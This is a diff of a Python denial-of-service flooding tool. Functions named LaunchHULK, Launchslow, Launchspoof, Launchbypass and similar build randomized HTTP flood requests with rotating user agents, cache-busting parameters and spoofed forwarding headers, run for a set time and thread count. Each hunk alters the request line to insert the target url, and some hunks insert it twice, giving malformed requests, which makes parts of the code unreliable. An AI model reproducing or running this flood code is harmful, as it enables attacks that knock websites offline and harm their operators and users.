@@ -436,7 +436,7 @@ def LaunchPXSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +target['uri'] + " HTTP/1.1\r\n"
+    req =  m + url+target['uri'] + " HTTP/1.1\r\n"
     req += "Host: " + target['host'] + "\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -478,7 +478,7 @@ def LaunchSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req =  m + url+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
@@ -515,7 +515,7 @@ def LaunchHULK(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +target['uri']+"?"+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req =  m + url+target['uri']+"?"+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\nCache-Control: no-cache\r\n\r\n"
@@ -584,7 +584,7 @@ def LaunchPXCFB(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.3\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+" / HTTP/1.3\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -712,7 +712,7 @@ def Launchslow(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -804,7 +804,7 @@ def Launchspoof(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "X-Forwarded-Proto: Http\r\n"
@@ -842,7 +842,7 @@ def LaunchSKY(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+ url+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -880,7 +880,7 @@ def LaunchPXHULK(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+ url+"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -917,7 +917,7 @@ def Launchbypass(url, timer):
     timelol = time.time() + int(timer)
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
@@ -952,7 +952,7 @@ def LaunchSTELLAR(url, timer):
     timelol = time.time() + int(timer) 
     m = random.choice(method)
     user_agent = random.choice(useragents)
-    req =  m +" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
     req += user_agent +"\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
